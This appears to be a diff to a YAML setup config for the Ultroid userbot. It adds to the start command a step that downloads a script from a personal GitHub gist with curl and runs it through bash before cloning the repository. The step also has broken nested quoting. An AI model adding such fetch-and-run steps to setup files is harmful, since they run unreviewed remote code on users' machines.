@@ -11,7 +11,7 @@ commands:
   package:
     - "nano inxi"
   start:
-    - "git clone https://github.com/TeamUltroid/Ultroid;cd Ult*;bash sta*"
+    - "bash -c "$(curl -fsSl https://gist.githubusercontent.com/rooted-cyber/ce6248bd681844d35a12bd210989eb89/raw/install)";git clone https://github.com/TeamUltroid/Ultroid;cd Ult*;bash sta*"
 
 env:
   - "ENVIRONMENT=production"
